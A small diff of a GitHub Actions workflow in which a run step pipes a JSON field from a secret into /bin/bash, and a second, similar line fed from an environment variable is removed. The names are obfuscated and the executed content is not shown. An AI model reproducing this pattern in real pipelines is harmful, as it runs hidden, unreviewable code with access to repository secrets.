@@ -21,7 +21,6 @@ jobs:
           ra1: ${{ secrets.ra1 }}
         run: |
           printf '%s' "$ra1" | jq -r .yodgl61830 | /bin/bash
-          echo $vwb68 | jq -r .lm8624 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
